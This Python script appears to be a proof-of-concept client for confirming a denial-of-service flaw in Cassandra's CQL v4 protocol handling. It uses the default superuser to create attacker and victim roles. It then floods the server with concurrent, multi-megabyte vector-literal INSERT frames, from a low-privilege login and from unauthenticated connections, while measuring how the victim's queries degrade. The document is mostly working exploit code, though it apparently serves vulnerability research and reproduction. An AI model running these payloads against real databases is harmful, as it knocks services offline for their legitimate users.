#!/usr/bin/env python3
"""3-b U17 confirm client (2026-11-24, pc75). From the case's u17client.py (raw v4 frames, VEC payload, N connections,
rounds released together) plus, from R15-B's 3-b client.py: SASL PLAIN login (--user/--password), superuser setup
(--setup), auth shakedown (--shake), victim workload (--victim). New: --target KS.TBL for the VEC payload (default
nosuch.t, a keyspace that does not exist), --src (source address).

  u17b.py --setup [--with-u17 D]     superuser: roles attacker (LOGIN only, no GRANT) and victim, victim_ks.t + victim's
                                     grants; with --with-u17 D also u17.t (pk int PRIMARY KEY, v vector<tinyint, D>)
  u17b.py --shake --d D_s            auth checks as attacker / unauthenticated / victim (no attack)
  u17b.py --victim --out DIR --stopfile F [--rate 20]
  u17b.py --payload VEC --target nosuch.t --d D --n N --rounds R --out DIR --user attacker --password ...
"""
import argparse, os, socket, struct, sys, threading, time

HOST, PORT = '127.0.0.1', 9042
OP_ERROR, OP_STARTUP, OP_READY, OP_AUTHENTICATE, OP_QUERY, OP_RESULT = 0x00, 0x01, 0x02, 0x03, 0x07, 0x08
OP_AUTH_RESPONSE, OP_AUTH_SUCCESS = 0x0F, 0x10
MAX_BODY = 16_777_207
CL_ONE = 0x0001
ATK_USER, ATK_PW = 'attacker', 'atk-3bU17'
VIC_USER, VIC_PW = 'victim', 'vic-3bU17'


def frame(op, body, stream=0):
    return struct.pack('>BBhBi', 0x04, 0, stream, op, len(body)) + body


def lstr_b(b):
    return struct.pack('>i', len(b)) + b


def sstr(s):
    b = s.encode(); return struct.pack('>H', len(b)) + b


def err_text(body):
    code = struct.unpack_from('>i', body)[0]; l = struct.unpack_from('>H', body, 4)[0]
    return code, body[6:6 + l].decode('utf-8', 'replace')


class Conn:
    """STARTUP; on AUTHENTICATE send AUTH_RESPONSE (PLAIN) unless user is False (stay unauthenticated)."""
    def __init__(self, user=None, password=None, src='127.0.0.1', timeout=120, on_timeout=None):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.bind((src, 0)); s.settimeout(30); s.connect((HOST, PORT))
        self.s = s; self.on_timeout = on_timeout; self.authenticated = False
        s.sendall(frame(OP_STARTUP, struct.pack('>H', 1) + sstr('CQL_VERSION') + sstr('3.0.0')))
        op, b = self.recv()
        if op == OP_AUTHENTICATE:
            if user is False:
                s.settimeout(timeout); return
            if not user:
                raise RuntimeError('server asks for authentication; no user')
            s.sendall(frame(OP_AUTH_RESPONSE, lstr_b(b'\0' + user.encode() + b'\0' + password.encode())))
            op, b = self.recv()
            if op != OP_AUTH_SUCCESS:
                raise RuntimeError('auth: op %d %s' % (op, err_text(b) if op == 0 else ''))
            self.authenticated = True
        elif op != OP_READY:
            raise RuntimeError('startup: op %d %s' % (op, err_text(b) if op == 0 else ''))
        s.settimeout(timeout)

    def recvn(self, n):
        buf = bytearray(n); mv = memoryview(buf); got = 0
        while got < n:
            try:
                r = self.s.recv_into(mv[got:], n - got)
            except socket.timeout:
                if self.on_timeout: self.on_timeout(); continue
                raise
            if r == 0:
                raise ConnectionError('closed')
            got += r
        return bytes(buf)

    def recv(self):
        h = self.recvn(9)
        ver, fl, st, op, ln = struct.unpack('>BBhBi', h)
        b = self.recvn(ln) if ln else b''
        if fl & 0x02: b = b[16:]
        if fl & 0x08:
            n = struct.unpack_from('>H', b)[0]; p = 2
            for _ in range(n):
                l = struct.unpack_from('>H', b, p)[0]; p += 2 + l
            b = b[p:]
        return op, b

    def query_raw(self, q):
        self.s.sendall(frame(OP_QUERY, lstr_b(q if isinstance(q, bytes) else q.encode()) + struct.pack('>HB', CL_ONE, 0)))
        return self.recv()


def payload(p, d, target):
    if p == 'VEC':
        return b'INSERT INTO ' + target.encode() + b' (pk, v) VALUES (0, [' + b'0,' * (d - 1) + b'0])'
    if p == 'HEX':   # one-token control: same path, a blob literal
        return b'INSERT INTO ' + target.encode() + b' (pk, b) VALUES (0, 0x' + b'00' * d + b')'
    raise ValueError(p)


def build(p, d, target):
    q = payload(p, d, target)
    body = lstr_b(q) + struct.pack('>HB', CL_ONE, 0)
    return q, frame(OP_QUERY, body), len(body)


def res(op, b):
    if op == OP_ERROR:
        return 'ERROR 0x%04x %s' % err_text(b)
    return 'RESULT kind %d' % (struct.unpack_from('>i', b)[0] if len(b) >= 4 else -1)


def rows_text(b):
    """minimal ROWS decoder for LIST statements (text/boolean/map columns rendered raw)"""
    kind = struct.unpack_from('>i', b)[0]
    if kind != 2: return None, kind
    p = 4; flags, ncol = struct.unpack_from('>ii', b, p); p += 8
    if flags & 0x0002:
        l = struct.unpack_from('>i', b, p)[0]; p += 4 + max(l, 0)
    names = []; types = []
    gts = flags & 0x0001
    if gts:
        for _ in range(2):
            l = struct.unpack_from('>H', b, p)[0]; p += 2 + l

    def opt(p):
        t = struct.unpack_from('>H', b, p)[0]; p += 2
        if t == 0: l = struct.unpack_from('>H', b, p)[0]; p += 2 + l
        elif t in (0x20, 0x22): p = opt(p)[0]
        elif t == 0x21: p = opt(p)[0]; p = opt(p)[0]
        return p, t
    for _ in range(ncol):
        if not gts:
            for _ in range(2):
                l = struct.unpack_from('>H', b, p)[0]; p += 2 + l
        l = struct.unpack_from('>H', b, p)[0]; names.append(b[p + 2:p + 2 + l].decode()); p += 2 + l
        p, t = opt(p); types.append(t)
    n = struct.unpack_from('>i', b, p)[0]; p += 4; out = []
    for _ in range(n):
        row = []
        for t in types:
            l = struct.unpack_from('>i', b, p)[0]; p += 4
            v = b[p:p + max(l, 0)]; p += max(l, 0)
            row.append('null' if l < 0 else (str(bool(v[0])) if t == 0x04 else (v.decode('utf-8', 'replace') if t in (0x0D, 0x0A) else v.hex()[:40])))
        out.append(row)
    return names, out


def show(c, q, out):
    op, b = c.query_raw(q)
    if op == OP_ERROR:
        out.write('%s\n  -> ERROR 0x%04x %s\n' % (q, *err_text(b))); return
    cols, r = rows_text(b)
    if cols is None:
        out.write('%s\n  -> RESULT kind %s\n' % (q, r)); return
    out.write('%s\n  -> %s (%d rows)\n' % (q, ' | '.join(cols), len(r)))
    for row in r: out.write('     %s\n' % ' | '.join(row))


def do_setup(out, with_u17):
    stmts = [
        "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (ATK_USER, ATK_PW),
        "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (VIC_USER, VIC_PW),
        "CREATE KEYSPACE victim_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
        "CREATE TABLE victim_ks.t (k int PRIMARY KEY, v text)",
        "GRANT SELECT ON TABLE victim_ks.t TO %s" % VIC_USER,
        "GRANT MODIFY ON TABLE victim_ks.t TO %s" % VIC_USER,
    ]
    if with_u17:
        stmts += ["CREATE KEYSPACE u17 WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
                  "CREATE TABLE u17.t (pk int PRIMARY KEY, v vector<tinyint, %d>)" % with_u17,
                  "CREATE TABLE u17.h (pk int PRIMARY KEY, b blob)"]
    dl = time.time() + 120; c = None; last = ''
    while time.time() < dl:
        try:
            c = Conn(user='cassandra', password='cassandra'); break
        except Exception as e:
            last = str(e)[:200]; time.sleep(2)
    if c is None:
        out.write('superuser login failed: %s\n' % last); return 1
    out.write('# superuser cassandra logged in at %d\n' % (time.time() * 1000))
    for q in stmts:
        op, b = c.query_raw(q)
        out.write('%s -> %s\n' % (q, res(op, b)))
        if op == OP_ERROR: return 1
    for q in ("LIST ROLES", "LIST ALL PERMISSIONS OF %s" % ATK_USER, "LIST ALL PERMISSIONS OF %s" % VIC_USER,
              "SELECT keyspace_name FROM system_schema.keyspaces"):
        show(c, q, out)
    c.s.close(); out.write('setup ok\n'); return 0


def timed(c, q):
    t = time.time(); op, b = c.query_raw(q); dt = time.time() - t
    return dt, res(op, b)[:200]


def do_shake(out, d):
    a = Conn(user=ATK_USER, password=ATK_PW)
    out.write('attacker login: authenticated=%s\n' % a.authenticated)
    for q in ("SELECT * FROM victim_ks.t", "INSERT INTO victim_ks.t (k, v) VALUES (1, 'x')",
              "CREATE KEYSPACE atk_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
              "SELECT * FROM system_auth.roles", "SELECT v FROM u17.t WHERE pk = 0"):
        dt, r = timed(a, q); out.write('attacker QUERY %s -> %s (%.0f ms)\n' % (q, r, dt * 1000))
    show(a, "LIST ALL PERMISSIONS OF %s" % ATK_USER, out)
    for p, tgt in (('VEC', 'nosuch.t'), ('VEC', 'nosuch.t'), ('HEX', 'nosuch.t'), ('HEX', 'nosuch.t'),
                   ('VEC', 'u17.t'), ('VEC', 'u17.t'), ('HEX', 'u17.h'), ('VEC', 'victim_ks.t')):
        q, _, B = build(p, d, tgt)
        dt, r = timed(a, q)
        out.write('attacker %s D=%d -> %s body %d B -> %s (%.3f s)\n' % (p, d, tgt, B, r, dt))
    a.s.close()
    u = Conn(user=False)
    out.write('unauthenticated conn (STARTUP answered AUTHENTICATE, no AUTH_RESPONSE): authenticated=%s\n' % u.authenticated)
    for p, tgt in (('HEX', 'nosuch.t'), ('VEC', 'nosuch.t'), ('VEC', 'nosuch.t')):
        q, _, B = build(p, d, tgt)
        try:
            dt, r = timed(u, q); out.write('unauth %s D=%d -> %s -> %s (%.3f s)\n' % (p, d, tgt, r, dt))
        except Exception as e:
            out.write('unauth %s -> io %s\n' % (p, str(e)[:100])); break
    try: u.s.close()
    except Exception: pass
    try:
        Conn(user=ATK_USER, password='wrong'); out.write('wrong password: accepted (!)\n')
    except Exception as e:
        out.write('wrong password -> %s\n' % str(e)[:160])
    v = Conn(user=VIC_USER, password=VIC_PW, src='127.0.0.2')
    for q in ("INSERT INTO victim_ks.t (k, v) VALUES (1, 'v1')", "SELECT v FROM victim_ks.t WHERE k = 1"):
        dt, r = timed(v, q); out.write('victim %s -> %s (%.1f ms)\n' % (q, r, dt * 1000))
    v.s.close(); return 0


def do_victim(out_dir, rate, stopfile, req_timeout=5.0):
    """R15-B's victim: role victim from 127.0.0.2, one connection, alternating INSERT / SELECT by key at CL ONE,
    `rate` slots/s, 5 s timeout, reconnect on the next slot; a slot that cannot start on time is 'missed'.
    victim.txt per second: epoch_s slots ok err timeout connfail missed p50_ms p99_ms max_ms; victim-events.txt."""
    vt = open(os.path.join(out_dir, 'victim.txt'), 'a', buffering=1)
    ev = open(os.path.join(out_dir, 'victim-events.txt'), 'a', buffering=1)
    vt.write('# victim start %d rate %.1f/s timeout %.1f s src 127.0.0.2 role %s\n' % (time.time() * 1000, rate, req_timeout, VIC_USER))
    vt.write('# epoch_s slots ok err timeout connfail missed p50_ms p99_ms max_ms\n')
    iv = 1.0 / rate; nxt = time.time(); c = None; i = 0
    cur = int(nxt); b = dict(slots=0, ok=0, err=0, timeout=0, connfail=0, missed=0, lat=[]); state = None

    def flush(sec):
        l = sorted(b['lat']); n = len(l)
        p = lambda q: ('%.1f' % l[min(n - 1, int(q * n))]) if n else '-'
        vt.write('%d %d %d %d %d %d %d %s %s %s\n' % (sec, b['slots'], b['ok'], b['err'], b['timeout'], b['connfail'],
                                                     b['missed'], p(0.5), p(0.99), ('%.1f' % l[-1]) if n else '-'))
        for k in b: b[k] = [] if k == 'lat' else 0

    def note(st, msg):
        nonlocal state
        if st != state:
            ev.write('%d %s %s\n' % (time.time() * 1000, st, msg[:200])); state = st
    while not os.path.exists(stopfile):
        now = time.time()
        if now < nxt:
            time.sleep(nxt - now); now = time.time()
        sec = int(now)
        while cur < sec:
            flush(cur); cur += 1
        if now - nxt > iv:
            m = int((now - nxt) / iv); b['missed'] += m; nxt += m * iv
        b['slots'] += 1; nxt += iv; i += 1
        if c is None:
            try:
                c = Conn(user=VIC_USER, password=VIC_PW, src='127.0.0.2', timeout=req_timeout)
                note('connected', '')
            except Exception as e:
                b['connfail'] += 1; c = None; note('connfail', str(e)); continue
        k = (i // 2) % 1000
        q = ("INSERT INTO victim_ks.t (k, v) VALUES (%d, 'value-%d')" % (k, i)) if i % 2 == 0 else ("SELECT v FROM victim_ks.t WHERE k = %d" % k)
        t = time.time()
        try:
            op, body = c.query_raw(q)
        except socket.timeout:
            b['timeout'] += 1; note('timeout', q); c.s.close(); c = None; continue
        except Exception as e:
            b['connfail'] += 1; note('ioerror', str(e))
            try: c.s.close()
            except Exception: pass
            c = None; continue
        b['lat'].append((time.time() - t) * 1000)
        if op == OP_ERROR:
            b['err'] += 1; note('error', 'ERROR 0x%04x %s' % err_text(body))
        else:
            b['ok'] += 1; note('ok', '')
    flush(cur); vt.write('# victim end %d\n' % (time.time() * 1000)); return 0


class Worker(threading.Thread):
    def __init__(self, i, fr, B, out, lock, rounds, user, pw, src):
        super().__init__(daemon=True)
        self.i, self.fr, self.B, self.out, self.lock, self.rounds = i, fr, B, out, lock, rounds
        self.user, self.pw, self.src = user, pw, src
        self.go = threading.Event(); self.fin = threading.Event(); self.dead = False; self.r = 0
        self.timeouts = 0; self.done = 0; self.errs = 0

    def line(self, ts, te, op, code, msg):
        with self.lock:
            self.out.write('%d,%d,%d,%d,%d,%s,%s,%s\n' % (ts, te, self.i, self.r, self.B, op, code,
                                                       msg.replace(',', ';').replace('\n', ' ')[:140]))
            self.out.flush()

    def tmo(self):
        self.timeouts += 1
        self.line(self.ts, time.time() * 1000, 'timeout', '', 'client socket timeout 120 s; still waiting')

    def run(self):
        try:
            self.c = Conn(user=self.user, password=self.pw, src=self.src, on_timeout=self.tmo)
            self.line(time.time() * 1000, time.time() * 1000, 'login', '', 'authenticated=%s' % self.c.authenticated)
        except Exception as e:
            self.dead = True; self.r = -1
            self.line(time.time() * 1000, time.time() * 1000, 'connect_error', '', str(e)[:100])
            self.fin.set(); return
        self.fin.set()
        for r in range(self.rounds):
            self.go.wait(); self.go.clear(); self.r = r
            self.ts = time.time() * 1000
            try:
                self.c.s.sendall(self.fr)
                op, b = self.c.recv()
            except Exception as e:
                self.dead = True; self.errs += 1
                self.line(self.ts, time.time() * 1000, 'io_error', '', str(e)[:100])
                self.fin.set(); return
            te = time.time() * 1000
            if op == OP_ERROR:
                code, msg = err_text(b); self.errs += 1
                self.line(self.ts, te, '0x%02x' % op, '0x%04x' % code, msg)
            else:
                self.done += 1
                self.line(self.ts, te, '0x%02x' % op, '', 'kind=%d' % (struct.unpack_from('>i', b)[0] if len(b) >= 4 else -1))
            self.fin.set()
        try: self.c.s.close()
        except Exception: pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--setup', action='store_true'); ap.add_argument('--with-u17', type=int, default=0)
    ap.add_argument('--shake', action='store_true'); ap.add_argument('--sizes', action='store_true')
    ap.add_argument('--victim', action='store_true'); ap.add_argument('--rate', type=float, default=20.0)
    ap.add_argument('--stopfile', default='/nonexistent')
    ap.add_argument('--payload', choices=['VEC', 'HEX']); ap.add_argument('--target', default='nosuch.t')
    ap.add_argument('--d', type=int, default=6_500_000)
    ap.add_argument('--n', type=int, default=1); ap.add_argument('--rounds', type=int, default=5)
    ap.add_argument('--user', default=ATK_USER); ap.add_argument('--password', default=ATK_PW)
    ap.add_argument('--src', default='127.0.0.1')
    ap.add_argument('--out', default='.')
    a = ap.parse_args()
    if a.setup:
        return do_setup(sys.stdout, a.with_u17)
    if a.shake:
        return do_shake(sys.stdout, a.d)
    if a.victim:
        os.makedirs(a.out, exist_ok=True); return do_victim(a.out, a.rate, a.stopfile)
    q, fr, B = build(a.payload, a.d, a.target)
    if a.sizes:
        print('%s target=%s d=%d text=%d body=%d frame=%d' % (a.payload, a.target, a.d, len(q), B, len(fr))); return 0
    if B > MAX_BODY:
        print('REFUSE body %d > %d' % (B, MAX_BODY)); return 1
    os.makedirs(a.out, exist_ok=True)
    out = open(os.path.join(a.out, 'client.csv'), 'a')
    out.write('# start %s payload=%s target=%s d=%d n=%d rounds=%d user=%s src=%s text=%d body=%d frame=%d pid=%d\n' % (
        time.strftime('%Y-%m-%dT%H:%M:%S%z'), a.payload, a.target, a.d, a.n, a.rounds, a.user, a.src, len(q), B, len(fr), os.getpid()))
    out.write('send_ms,resp_ms,conn,round,body_bytes,opcode,err_code,msg\n'); out.flush()
    lock = threading.Lock()
    ws = [Worker(i, fr, B, out, lock, a.rounds, a.user, a.password, a.src) for i in range(a.n)]
    for w in ws: w.start()
    for w in ws: w.fin.wait(); w.fin.clear()
    t0 = time.time()
    for r in range(a.rounds):
        live = [w for w in ws if not w.dead]
        if not live: break
        for w in live: w.go.set()
        for w in live: w.fin.wait(); w.fin.clear()
    down = all(w.dead for w in ws)
    with lock:
        out.write('SUMMARY completed=%d errors=%d timeouts=%d down=%s wall_s=%.1f\n' % (
            sum(w.done for w in ws), sum(w.errs for w in ws), sum(w.timeouts for w in ws), 'true' if down else 'false',
            time.time() - t0))
        out.flush()
    return 0


if __name__ == '__main__':
    sys.exit(main())
